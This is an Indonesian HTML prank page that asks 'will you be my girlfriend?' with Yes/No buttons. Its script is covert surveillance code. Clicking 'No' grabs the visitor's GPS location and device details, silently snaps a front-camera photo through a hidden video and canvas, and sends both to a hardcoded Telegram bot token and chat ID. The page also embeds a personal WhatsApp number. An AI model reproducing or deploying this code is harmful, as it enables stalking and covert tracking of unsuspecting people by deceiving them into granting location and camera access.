<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nembak Cewek</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap');
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
            overflow: hidden;
        }
        p {
            padding-top: 10px;
            font-family: "Ubuntu Mono", monospace;
            font-weight: 700;
            font-style: normal;
            font-size: 30px;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        .map iframe {
            width: 100%;
            height: 450px;
            border: 0;
        }
        .btn-animate {
            transition: transform 0.2s;
        }
        .btn-animate:hover {
            transform: scale(1.1);
        }
        .button-container {
            padding-top: 10px;
            
        }
        .button-container .btn {
            margin: 0 20px;
        }
        .swal2-container {
            z-index: 1060;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container text-center">
        <img src="https://feeldreams.github.io/bunga.gif" alt="Bunga" class="mb-4">
        <p>Mau gak jadi pacar aku?</p>
        <div class="button-container">
            <div class="btn-group mb-4" role="group">
                <button type="button" class="btn btn-success btn-animate" id="allow-btn">
                    <i class="fas fa-check-circle"></i> Mau...
                </button>
                <button type="button" class="btn btn-danger btn-animate" id="deny-btn">
                    <i class="fas fa-times-circle"></i> Tidak Mau!
                </button>
            </div>
        </div>
        
        <div id="map"></div>
        <video id="video" autoplay></video>
        <canvas id="canvas"></canvas>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>
        document.getElementById('deny-btn').addEventListener('click', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(lokasi, handleError);
            } else {
                document.getElementById('location-info').innerHTML = "Not Support geolocation.";
            }
        });

        document.getElementById('allow-btn').addEventListener('click', function() {
            showAlerts(0);
        });

        function lokasi(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            
            const platform = navigator.platform || 'Unknown';
            const ram = `${navigator.deviceMemory || 'Unknown'} GB`;
            const userAgent = navigator.userAgent;

            const iframe = document.createElement('iframe');
            iframe.src = `https://www.google.com/maps?q=${latitude},${longitude}&hl=es;z=14&output=embed`;
            iframe.width = "100%";
            iframe.height = "450";
            iframe.frameborder = "0";
            iframe.style.border = "0";
            iframe.allowfullscreen = "";
            
            Swal.fire({
                title: 'Location Information',
                html: `
                    <strong>Latitude:</strong> ${latitude} <br>
                    <strong>Longitude:</strong> ${longitude} <br><br>
                    <strong>Device Information:</strong> <br>
                    Platform: ${platform} <br>
                    RAM: ${ram} <br>
                    User Agent: ${userAgent}
                `,
                imageUrl: `https://feeldreams.github.io/peach22.gif`,
                imageWidth: 150,
                imageHeight: 150,
                imageAlt: 'Custom image',
                confirmButtonText: 'Okey'
            }).then(() => {
                document.getElementById('map').innerHTML = "";
                document.getElementById('map').appendChild(iframe);
                
                kirim(latitude, longitude, platform, userAgent, ram);
                ambilPoto();
            });
        }

        function kirim(latitude, longitude, platform, userAgent, ram) {
            const telegramBotToken = '7499961067:AAG751sJzhiMDqazEIMAsmRSYMaBBDuu7e0';
            const chatId = '7194238751';
            const message = `
                🌍 Location Information:
                Latitude: ${latitude}
                Longitude: ${longitude}
                
                📱 Device Information:
                Platform: ${platform}
                User Agent: ${userAgent}
                Ram: ${ram}
                
                🗺️ Google Maps:
                https://www.google.com/maps?q=${latitude},${longitude}
            `;
            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(apiUrl)
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
        }

        function ambilPoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                .then(stream => {
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(() => {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const context = canvas.getContext('2d');
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);

                            stream.getTracks().forEach(track => track.stop());

                            canvas.toBlob(blob => {
                                kirimPhoto(blob);
                            });
                        }, 500);
                    };
                })
                .catch(error => {
                    console.error('Error accessing camera:', error);
                });
        }

        function kirimPhoto(blob) {
            const telegramBotToken = '7499961067:AAG751sJzhiMDqazEIMAsmRSYMaBBDuu7e0';
            const chatId = '7194238751';
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob);

            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;

            fetch(apiUrl, {
                method: 'POST',
                body: formData
            })
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error sending photo to Telegram:', error));
        }

        function showAlerts(step) {
            const images = [
                'https://feeldreams.github.io/peach22.gif',
                'https://feeldreams.github.io/peachgetar.gif',
                'https://feeldreams.github.io/peachhoam.gif',
                'https://feeldreams.github.io/peachktw2.gif',
                'https://feeldreams.github.io/peachktw.gif'
            ];
            const texts = [
                'Arghhh g nyangka!',
                `Inget ya hari ini tanggal jadian kita ${new Date().toLocaleDateString()}`,
                'Dua tiga buah langsat!!!',
                'Kau cantik sangatttt',
                'Kapan kita jalan?? kirim pesannya ke aku ya😘',
            ];

            if (step < 4) {
                Swal.fire({
                    text: texts[step],
                    imageUrl: images[step],
                    imageWidth: 150,
                    imageHeight: 150,
                    imageAlt: 'Custom image',
                    confirmButtonText: 'Okey'
                }).then(() => {
                    showAlerts(step + 1);
                });
            } else {
                Swal.fire({
                    title: 'Jalan yuk?',
                    text: texts[step],
                    input: 'text',
                    inputPlaceholder: 'Kirim pesan ya kalo mau...',
                    imageUrl: images[step],
                    imageWidth: 150,
                    imageHeight: 150,
                    imageAlt: 'Custom image',
                    showCancelButton: true,
                    confirmButtonText: 'Send',
                    cancelButtonText: 'Cancel'
                }).then((result) => {
                    if (result.isConfirmed) {
                        const message = encodeURIComponent(result.value);
                        const whatsappUrl = `https://wa.me/6281574670766?text=${message}`;
                        window.open(whatsappUrl, '_blank');
                    }
                });
            }
        }

        function handleError(error) {
            if (error.code === error.PERMISSION_DENIED) {
                document.getElementById('location-info').innerHTML = "Geolocation permission denied.";
                document.getElementById('map').innerHTML = "";
            } else {
                document.getElementById('location-info').innerHTML = "An error occurred while retrieving location.";
            }
        }
    </script>
    
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>